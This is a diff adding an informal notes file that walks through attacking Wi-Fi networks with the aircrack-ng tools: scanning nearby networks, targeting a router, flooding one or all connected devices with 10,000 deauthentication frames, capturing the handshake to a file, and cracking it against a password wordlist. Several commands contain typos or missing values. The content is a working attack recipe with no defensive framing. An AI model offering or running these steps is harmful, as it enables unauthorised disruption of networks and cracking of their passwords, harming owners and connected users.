@@ -1,0 +1,26 @@
+airmon-ng start wlan0
+airodump-ng wlan0mon (use this to get all the wifi networks out in sky and >/router and networks attached to it)
+
+then after finding it use 
+airodump-ng  wlan0mon  --bssid (the_mac_target) --channel (no)
+
+//now after getting it
+
+use 
+
+airreplay-ng -0(deauth no.)  10000(no. of req keep it very high) -a(main router/accesspoint_id) -c(the clients id)  wlanomon
+
+//this one for de authing specific device connected to the network 
+------------------------------------->
+
+use this one for de authing all the devices from the network
+
+aireplay-ng -0 10000 -a (main router/accesspoint) wlan0mon
+
+
+-----------------------------------------------------------------<>------------------------------------------------------------------------------------------------------------------
+now for writing file so you could use it for late purpose 
+airodump-ng wlan0mon --bssid --channel(no)  -w file(optional format.cap is fine)
+
+now we use aircrack-ng 
+aircrack-ng (captured file location)/Desktop/file.cap -w(the list of dictnary)/usr/share/rockboy.txt.gz 
